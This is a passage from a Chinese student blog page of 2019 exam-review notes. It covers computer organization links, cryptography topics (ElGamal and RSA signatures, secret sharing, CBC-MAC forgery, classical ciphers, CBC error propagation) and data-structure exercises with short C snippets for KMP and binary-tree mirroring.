                <a class="post-title-link" href="/2019/07/07/计算机组成原理期末复习/" itemprop="url">计算机组成原理期末复习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T16:18:21+08:00">
                2019-07-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  21
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p><a href="https://www.cnblogs.com/wkfvawl/p/11004628.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkfvawl/p/11004628.html</a></p>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p><a href="https://www.cnblogs.com/wkfvawl/p/10954376.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkfvawl/p/10954376.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/01/密码学期末-whitegive/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/01/密码学期末-whitegive/" itemprop="url">密码学期末-whitegive</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-01T21:32:24+08:00">
                2019-07-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  3.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  11
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>老师是个好老师，然而我个渣渣还是担心白给</p>
<h3 id="elgamal签名算法，有公式，推导相关内容"><a href="#elgamal签名算法，有公式，推导相关内容" class="headerlink" title="elgamal签名算法，有公式，推导相关内容"></a>elgamal签名算法，有公式，推导相关内容</h3><p><a href="https://blog.mythsman.com/2015/10/07/3/" target="_blank" rel="noopener">https://blog.mythsman.com/2015/10/07/3/</a></p>
<p><img src="https://s1.ax1x.com/2018/12/24/F6olQK.png" alt="img"></p>
<p>例题：(很遗憾，没有找到答案。gg，直接白给，按照老师的描述，好像和第一小问差不多)</p>
<p>Alice使用ElGamal签名方案签名，她选择参数： 公钥p=41，本原元α=5，β=2，私钥a=3。 <br>（a） Alice对消息x=47的签名过程中，通过伪随机数发生器产生随机数k=13，请计算签名),(γ,δ) <br>提示：γ=(α^k)modp,β = (x-aγ)^(k^-1)mod(p-1)<br>（b） 如果Alice裸露了随机数k，Oscar能否计算出Alice的私钥？如果可以，请写出计算方法。 <br>（c） Alice每次签名都使用默认的随机数生成器的种子，因此每次签名使用的随机数k总<br>是相同的。请问Oscar能否根据Alice的已知签名对Alice造成安全威胁？如果可以，请写出计算方法。 </p>
<p>（d） 如果Alice在签名前先计算消息x的hash值()z=hx，其中h是hash函数，然后计算z的签名。为了保证方案的安全性，对hash函数h有哪些要求？</p>
<h3 id="rsa加密"><a href="#rsa加密" class="headerlink" title="rsa加密"></a>rsa加密</h3><p><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48486" target="_blank" rel="noopener">https://www.kancloud.cn/kancloud/rsa_algorithm/48486</a></p>
<p>它的安全性基于<strong>大整数的因数分解</strong>的困难性。</p>
<p>任意生成两个大素数 <strong>p</strong> 和 <strong>q</strong>，由他们计算 <strong>n = p·q</strong> 是容易的，但由 <strong>n</strong> 分解出 <strong>p</strong> 和 <strong>q</strong> 是困难的。</p>
<p>也很容易由 <strong>p</strong> 和 <strong>q</strong> 计算出 <strong>n</strong> 的欧拉函数 <strong>φ(n) = (p-1)·(q-1)</strong> ，这样，我们选定一个与 <strong>φ(n)</strong> 互素的数 <strong>e</strong> 作为加密因子，可由<strong>扩展Euclid算法</strong>计算出解密因子 <strong>d</strong> （即私钥），其中 <strong>d e≡ 1(mod φ(n))</strong>。</p>
<p>总结下就是这样：</p>
<p>任意选取两个大素数 <strong>p</strong> 和 <strong>q</strong>，</p>
<p><strong>n = p·q</strong></p>
<p><strong>φ(n) = (p-1)·(q-1)</strong></p>
<p><strong>e·d ≡ 1 (mod φ(n))</strong></p>
<p>加密算法：<strong>c ≡ me (mod n)</strong></p>
<p>解密算法：<strong>m ≡ cd (mod n)</strong></p>
<p>公钥为 <strong>(n,e)</strong> ，私钥为 <strong>d</strong></p>
<h4 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h4><p>要求生成密钥的时候就生成密钥d，公钥e随机选取与欧拉函数互质就好</p>
<h4 id="签名算法对应RSA密码体制中的加密过程。"><a href="#签名算法对应RSA密码体制中的加密过程。" class="headerlink" title="签名算法对应RSA密码体制中的加密过程。"></a>签名算法对应RSA密码体制中的加密过程。</h4><p>设待签名的消息为 m，则签名者A先利用一个安全的Hash函数 h 来产生一个消息摘要 h(m)，然后签名者用自己的私钥计算签名</p>
<p> s≡h(m)^d mod n ，将 (s,m)发送给消息接收者 B。</p>
<h4 id="验证算法"><a href="#验证算法" class="headerlink" title="验证算法"></a>验证算法</h4><p><em>验证算法对应RSA密码体制中的解密过程。</em></p>
<p>签名接收者 B 收到消息 m 和 签名 s 后，先利用 A 使用的Hash函数 h 来产生一个消息摘要 h(m)，然后检验同余式 h(m)≡s^e mod n是否成立。若成立，则说明签名有效，否则签名无效。</p>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p>引入Hash函数使得单纯地对消息本身进行签名具有更好的抗攻击性。而且，若攻击者截取一段发往签名者的密文，将其盲化（乘上一个盲化因子 <strong>R</strong> 的 <strong>e</strong> 次方）后发送给签名者让其签名，攻击者就能从中计算出密文对应的明文。另外，对于大消息来说，将其映射到固定长度再签名，大大提升了签名的效率。</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>（1）请利用著名的RSA公钥密码算法设计一个数字签名算法（称为RSA签名算法）。<br>（2）由于RSA签名算法每次只能对一个固定长度（比如N比特）的消息进行签名，为了对任意长度的消息进行签名，有人建议了这样一种处理方法：首先将长消息切割成固定长度N比特的数据块，然后用RSA签名算法对每个数据块进行签名，最后将这些签名块拼接起来就得到了长消息的签名。请问这种切割处理方法所获得的签名算法安全吗？为什么？ <br>    答：（1）RSA签名算法的系统参数可设为n=pq,且p和q是两个大素数，则 M=A=Zn,定义К={（n,d,p,q,e）}这里e和d 满足ed=1(modΦ(n))( Φ()是欧拉函数)。公开密钥 n,d；私有密钥 p,q,e； 签名算法为Sig2K (x)=x^e mod n；签名验证算法为Ver(x,y)=TRUE<->x=y^d(modn). (x,y)属于ZnxZn。更直观地说，用RSA解密算法作为签名，用RSA的加密作为验证，于是，只有合法用户自己才能签名，而任何人都可以验证签名的真实性。其实，基于任何一个加、解密算法顺序可交换的密码算法都可用于设计一个数字签名算法，只需要以解密做签名，以加密做验证就行了。 <br>   （2）切割和拼接处理方法所获得的签名算法不安全。因为，假如m和n是两个N比特的消息，那么，黑客可以通过已知的m和n的签名S(m)S(n)，至少获得另一个消息nm的合法签名S(n)S(m)</-></p>
<h3 id="门限方案的考法：给出几个share，你们会重构出秘密值就可以"><a href="#门限方案的考法：给出几个share，你们会重构出秘密值就可以" class="headerlink" title="门限方案的考法：给出几个share，你们会重构出秘密值就可以"></a>门限方案的考法：给出几个share，你们会重构出秘密值就可以</h3><p>需要用到插值多项式的公式</p>
<p>假设现在存在多项式</p>
<p><img src="https://img-blog.csdn.net/20181005104343810?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3o3ODQ1NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p>
<p>这时候，秘密就被藏在这里，假设是常数项1</p>
<p>then，我们有以下几个share</p>
<p><img src="https://img-blog.csdn.net/20181005104448993?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3o3ODQ1NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p>
<p>由门限方案的特点我们知道，我们这时候至少需要知道3个share才能得到原多项式。而得到的方法可以试二次多项式，或者是插值多项式，一样的。</p>
<p><img src="https://img-blog.csdn.net/2018100510495112?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3o3ODQ1NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p>
<p><img src="https://img-blog.csdn.net/20181005105046900?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3o3ODQ1NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p>
<h3 id="存在性伪造大题"><a href="#存在性伪造大题" class="headerlink" title="存在性伪造大题"></a>存在性伪造大题</h3><p>伪造：伪造一个没有经过认证的(M,MAC)对</p>
<p>存在性伪造：如果攻击者只能够对一个不由他控制的消息进行伪造，那么这种攻击被称为存在性伪造攻击</p>
<p>选择性伪造：能够对他选择的消息进行伪造攻击</p>
<p>Mac的伪造：</p>
<p>  用hash函数构造</p>
<p>  用分组密码构造</p>
<p>  用伪随机函数构造</p>
<p>  其他</p>
<p>关于cbc-mac伪造的</p>
<p> <img src="/2019/07/01/密码学期末-whitegive/捕获.PNG" alt="捕获"></p>
<p>！！！！！找到了</p>
<p> <img src="/2019/07/01/密码学期末-whitegive/1.PNG" alt="1"></p>
<h3 id="【实在不忍心了】参考例题会考-但考的题很少很少少少少少"><a href="#【实在不忍心了】参考例题会考-但考的题很少很少少少少少" class="headerlink" title="【实在不忍心了】参考例题会考 但考的题很少很少少少少少"></a>【实在不忍心了】参考例题会考 但考的题很少很少少少少少</h3><p><a href="https://github.com/ppcrab/Learning_Resources/blob/master/%E3%80%8A%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%8B%E5%8F%82%E8%80%83%E4%BE%8B%E9%A2%98_new.pdf" target="_blank" rel="noopener">https://github.com/ppcrab/Learning_Resources/blob/master/%E3%80%8A%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%8B%E5%8F%82%E8%80%83%E4%BE%8B%E9%A2%98_new.pdf</a></p>
<h3 id="那些古典密码的密钥空间大小要看一看"><a href="#那些古典密码的密钥空间大小要看一看" class="headerlink" title="那些古典密码的密钥空间大小要看一看"></a>那些古典密码的密钥空间大小要看一看</h3><p><a href="https://www.cnblogs.com/FZfangzheng/p/9136108.html" target="_blank" rel="noopener">https://www.cnblogs.com/FZfangzheng/p/9136108.html</a></p>
<p>置换密码：</p>
<p>就是置换π，π的描述中其实包含了分组长度m的信息，密钥空间大小 m!（第一个有m种选择，第二个有m-1种…）<br>代换：</p>
<p>​    移位密码：</p>
<p>​            凯撒密码是k=3的移位密码</p>
<p>​            密钥k-&gt;空间26</p>
<p>​    简单代换：</p>
<p>​            26!</p>
<p>多表代换：</p>
<p>​    维吉尼亚密码：</p>
<p>​    密钥空间和密钥长度有关为26^m</p>
<h3 id="双线性映射"><a href="#双线性映射" class="headerlink" title="双线性映射"></a>双线性映射</h3><p>记住双线性性质，题目给出两个式子，你们套用性质，计算出两个式子是相等的</p>
<p>双线性映射<br>抽象意义的双线性映射描述如下：</p>
<p>设G1、G2都是阶为p的循环群，p是素数。如果映射e: G1 × G1 → G2 满足以下性质：<br>（1）双线性性。<br>对于任意a，b∈Zp和R，S∈G1，有e(Ra, Sb) = e(R, S)ab；</p>
<p>（2）非退化性。<br>存在R，S∈G1，使得e(R, S) ≠ 1G2。这里1G2代表G2群的单位元；</p>
<p>存在有效的算法对任意的R，S∈G1，计算e(R, S)！</p>
<p><img src="https://img-blog.csdnimg.cn/20190329112158788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NTMyMTQw,size_16,color_FFFFFF,t_70" alt=""></p>
<p>虽然不会，但是看起来老师的意思是说要用到推论四</p>
<h3 id="最小公倍数的应用（ppt例题）"><a href="#最小公倍数的应用（ppt例题）" class="headerlink" title="最小公倍数的应用（ppt例题）"></a>最小公倍数的应用（ppt例题）</h3><h3 id="CBC错误传播的计算（某几个密文分组错误，会影响哪几个的解密）"><a href="#CBC错误传播的计算（某几个密文分组错误，会影响哪几个的解密）" class="headerlink" title="CBC错误传播的计算（某几个密文分组错误，会影响哪几个的解密）"></a>CBC错误传播的计算（某几个密文分组错误，会影响哪几个的解密）</h3><p>CBC 工作模式是在密钥固定不变的情况下，改变每个明文组输入的链接技术。在CBC 模式下，每个明文组mi 在加密之前, 先与反馈至输入端的前一组密文ci逐比特异或后再加密。</p>
<p><img src="https://howieliux.github.io/assets/others/hao_dsliu_htmls/pic/img2.ph.126.net_ZruG8w-c0fEgD38-lO5f8A==_6631277772425755121.jpg" alt=""></p>
<p><img src="https://howieliux.github.io/assets/others/hao_dsliu_htmls/pic/img0.ph.126.net_m9CSxYqTam6slulV1QBeVw==_6631406415286203639.jpg" alt=""></p>
<p>算法特点:</p>
<ul>
<li>每次加密的密文长度为64位(8个字节);</li>
<li>当相同的明文使用相同的密钥和初始向量的时候CBC模式总是产生相同的密文;</li>
</ul>
<p><strong>优点：</strong></p>
<p>1.可以使用不同的初始化向量来避免相同的明文产生相同的密文,一定程度上抵抗字典攻击; 不容易主动攻击,安全性好于ECB,适合传输长度长的报文,是SSL、IPSec的标准。</p>
<p><strong>缺点：</strong></p>
<p>1.密文块要依赖以前的操作结果，所以，密文块不能进行重新排列，无法并行计算； (在解密时，从两个邻接的密文块中即可得到一个平文块。因此，解密过程可以被并行化) 。</p>
<p>2需要初始化向量IV</p>
<p>3会出现错误传播(errorpropagation). 密文中任一位发生变化会涉及后面一些密文组. 但CBC 模式的错算法特点:</p>
<ul>
<li>每次加密的密文长度为64位(8个字节);</li>
<li>当相同的明文使用相同的密钥和初始向量的时候CBC模式总是产生相同的密文;</li>
</ul>
<p><strong>优点：</strong></p>
<p>1.可以使用不同的初始化向量来避免相同的明文产生相同的密文,一定程度上抵抗字典攻击; 不容易主动攻击,安全性好于ECB,适合传输长度长的报文,是SSL、IPSec的标准。</p>
<p><strong>缺点：</strong></p>
<p>1.密文块要依赖以前的操作结果，所以，密文块不能进行重新排列，无法并行计算； (在解密时，从两个邻接的密文块中即可得到一个平文块。因此，解密过程可以被并行化) 。</p>
<p>\2. 需要初始化向量IV</p>
<p>\3. 会出现错误传播(errorpropagation). 密文中任一位发生变化会涉及后面一些密文组. 但CBC 模式的错误传播不大, 一个传输错误至多影响两个消息组的接收结果 (思考).</p>
<p>关于错误传播的问题，我的理解是这样的。因为分组密码模式的分组特性导致了这一现象。每个组之间是独立的。所以如果在传输中即使有某一位发生了错误，也仅仅可以理解为某一组发生了错误，对其他组没有影响。</p>
<p>比如A组发生了位错乱，它最多影响到当前A这组明文和下一组B明文。而再下一组C就不受影响了，因为C组是根据B的密文作为输入的，但是B分组的位并没有发生错误，所以在CBC模式下错误传播最多持续2个分组</p>
<h3 id="奇异，非奇异。超奇异椭圆曲线以及双线性映射之间的关系"><a href="#奇异，非奇异。超奇异椭圆曲线以及双线性映射之间的关系" class="headerlink" title="奇异，非奇异。超奇异椭圆曲线以及双线性映射之间的关系"></a>奇异，非奇异。超奇异椭圆曲线以及双线性映射之间的关系</h3><p><a href="https://baike.baidu.com/link?url=2fcWrbBJEn7eYi7hCurG4Zo5_-5A-8rRClX1MZj8C68BVqOc_obIoITfqAVXlsuxbo6jQI6iEsQ_XcTNCvINxlScLu7a84SdwqX_zPmmLAWboexyPFf_hK8Jd6quJy-cD2j8C6nWV9eNecuWDA2kImbGIbxtsaGnoPdTCpLRQxC" target="_blank" rel="noopener">椭圆曲线密码学</a></p>
<p>ECC被广泛认为是在给定密钥长度的情况下，最强大的非对称算法</p>
<p>ECC的另一个优势是可以定义群之间的<a href="https://baike.baidu.com/item/%E5%8F%8C%E7%BA%BF%E6%80%A7%E6%98%A0%E5%B0%84" target="_blank" rel="noopener">双线性映射</a>，基于Weil对或是Tate对</p>
<p>双线性映射可以通过有线域上的超椭圆曲线上的Tate对或Weil对来构造。</p>
<p>(不找了，这部分白给就白给吧，实在是难，考个选择题估计就是这些吧，简答题写上这些应该有分？)</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>DES：数据加密标准，对称密码算法，用于加密；</p>
<p>AES: 高级加密标准，对称密码算法，用于加密；</p>
<p>RSA：最流行的公钥密码算法，加密和数字签名；</p>
<p>ECC：椭圆曲线密码，采用ElGamal算法，公钥密码算法，安全性高，密钥量小，灵活性好；</p>
<p>DSA：数字签名算法，是数字签名的一部分，公钥密码算法，数字签名。</p>
<p>MD5(SHA-1)：数字摘要算法，数字签名，保证消息的完整性。</p>
<h3 id="其他参考网站"><a href="#其他参考网站" class="headerlink" title="其他参考网站"></a>其他参考网站</h3><p><a href="https://comydream.github.io/2018/12/24/cryptography-protocol/index.html" target="_blank" rel="noopener">https://comydream.github.io/2018/12/24/cryptography-protocol/index.html</a></p>
<p><a href="https://howieliux.github.io/assets/others/hao_dsliu_htmls/bb_1000016.htm" target="_blank" rel="noopener">https://howieliux.github.io/assets/others/hao_dsliu_htmls/bb_1000016.htm</a></p>
<p><a href="https://blog.csdn.net/z784561257/article/details/82942581" target="_blank" rel="noopener">https://blog.csdn.net/z784561257/article/details/82942581</a></p>
<p><a href="https://lingyibin.iteye.com/blog/787060" target="_blank" rel="noopener">https://lingyibin.iteye.com/blog/787060</a></p>
<p><a href="http://silence.work/2018/07/06/%E7%A8%8B%E5%BA%8F%E7%8C%BF%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">http://silence.work/2018/07/06/%E7%A8%8B%E5%BA%8F%E7%8C%BF%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/</a></p>
<p><a href="https://wenku.baidu.com/view/e0829eeba5e9856a5712608f.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/e0829eeba5e9856a5712608f.html</a>（题目，有答案，但是没有详解）</p>
<p><a href="https://wenku.baidu.com/view/2bd37f57f01dc281e53af014.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/2bd37f57f01dc281e53af014.html</a>（题目，有答案）</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/06/27/数据结构期末复习总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/27/数据结构期末复习总结/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-27T17:05:57+08:00">
                2019-06-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  1.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  6
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本次总结以网上搜查为主，实在是重复造轮子效率低下，主要原因是我不会~</p>
<p>考虑到是以期末考试为主，所以csdn平台是本地参考网站的大部分来源。。。。不得不说，虽然csdn比较烂，然而水水期末考试还是相当有帮助的。</p>
<h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><p>10道选择      20分</p>
<p>4道简答        40分</p>
<p>4道编程题     40分</p>
<h3 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h3><h4 id="单链表插入和删除"><a href="#单链表插入和删除" class="headerlink" title="单链表插入和删除"></a>单链表插入和删除</h4><p><a href="https://blog.csdn.net/sunming0129/article/details/79904415" target="_blank" rel="noopener">https://blog.csdn.net/sunming0129/article/details/79904415</a></p>
<h4 id="链表合并（集合归并问题）有序表合并"><a href="#链表合并（集合归并问题）有序表合并" class="headerlink" title="链表合并（集合归并问题）有序表合并"></a>链表合并（集合归并问题）有序表合并</h4><p><a href="https://blog.csdn.net/mozha_666/article/details/79681210" target="_blank" rel="noopener">https://blog.csdn.net/mozha_666/article/details/79681210</a></p>
<p>链表类算法的最关键的点其实就是链表的创建，搞明白了链表是如何创建的，合并，插入，删除都搞明白了</p>
<h3 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h3><h4 id="进出栈（队列）的顺序"><a href="#进出栈（队列）的顺序" class="headerlink" title="进出栈（队列）的顺序"></a>进出栈（队列）的顺序</h4><h5 id="栈："><a href="#栈：" class="headerlink" title="栈："></a>栈：</h5><p>​    先进后出</p>
<p>​    中缀转后缀：</p>
<p>​           操作数直接转输出</p>
<p>​    操作符使用栈处理</p>
<p>​    新操作符与栈顶元素比较，若优先级小于等于栈顶，则栈顶弹出。然后新操作入栈，否则新操作符直接压入。</p>
<p>​    对于”(“，直接入栈，只有在新操作符为“）”时，将其上所有元素弹出。</p>
<p>​    链表实现和数组实现</p>
<p>如果进出栈的顺序不确定，输出序列符合何种规律</p>
<p>一个栈的进栈序列是a，b，c，d，e，则栈的不可能的输出序列是   C   。</p>
<p> A．edcba      B．decba    C．dceab      D．abcde  <br>设有一个栈，元素依次进栈的顺序为A、B、C、D、E。下列   C   是不可能的出栈序列。 </p>
<p> A．A,B,C,D,E   B．B,C,D,E,A    C．E,A,B,C,D     D．E,D,C,B,A</p>
<p>关键在于进栈的序列是知道的，然而什么时候出栈不知道，即进出栈是可以穿插进行的，只需要进栈总的序列满足题意即可</p>
<h5 id="队列："><a href="#队列：" class="headerlink" title="队列："></a>队列：</h5><ul>
<li><p>先进先出</p>
</li>
<li><p>数组实现</p>
</li>
<li><p>用于服务器区块的响应，使用排队论解决响应与阻塞问题。</p>
<p>​</p>
</li>
</ul>
<h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><p><a href="https://blog.csdn.net/you_will_know_me/article/details/77102567" target="_blank" rel="noopener">https://blog.csdn.net/you_will_know_me/article/details/77102567</a></p>
<p><a href="https://www.cnblogs.com/lisen10/p/10850063.html" target="_blank" rel="noopener">https://www.cnblogs.com/lisen10/p/10850063.html</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(SString *t, <span class="keyword">int</span> *next)</span></span></span><br><span class="line"><span class="function"></span>&#123;  <span class="comment">/*串t即作为目标串又作为模式串*/</span></span><br><span class="line">    <span class="keyword">int</span> j,k;</span><br><span class="line">    j=<span class="number">0</span>;k=<span class="number">-1</span>;next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;t-&gt;curlen<span class="number">-1</span>)  &#123;</span><br><span class="line">       <span class="keyword">if</span>(k==<span class="number">-1</span>||t-&gt;str[j]==t-&gt;str[k]) &#123;</span><br><span class="line">          j++;k++;</span><br><span class="line">          <span class="keyword">if</span>(t-&gt;str[j]!=t-&gt;str[k])</span><br><span class="line">              next[j]=k;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">              next[j]=next[k];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> k=next[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>i和j怎样变换</p>
<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><h4 id="左右子树如何变换？（用递归算法能否实现）"><a href="#左右子树如何变换？（用递归算法能否实现）" class="headerlink" title="左右子树如何变换？（用递归算法能否实现）"></a>左右子树如何变换？（用递归算法能否实现）</h4><p><a href="https://zhidao.baidu.com/question/551935782.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/551935782.html</a></p>
<p>第一个回答是用的递归算法的实现，第二个则是定义了一个新的结构体，十分有意思。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">exchangeLR(&amp;root); <span class="comment">//root为树的根节点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchangeLR</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TreeNode *tmp;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 左子树交换</span></span><br><span class="line">exChangeLR(root-&gt;left);</span><br><span class="line"><span class="comment">// 右子树交换</span></span><br><span class="line">exChangeLR(root-&gt;right);</span><br><span class="line"><span class="comment">// 交换当前结点的左右子树</span></span><br><span class="line">tmp = root-&gt;left;</span><br><span class="line">root-&gt;left = root-&gt;right;</span><br><span class="line">root-&gt;right = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//看起来十分正确的样子~</span></span><br><span class="line"><span class="comment">//原来节点结构体：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Element X;</span><br><span class="line">Node* pLeft;</span><br><span class="line">Node* pRight;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//现在从新定义一个结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Element X;</span><br><span class="line">NewNode* pRight;</span><br><span class="line">NewNode* pLeft;</span><br><span class="line">&#125;NewNode;</span><br><span class="line"></span><br><span class="line"><span 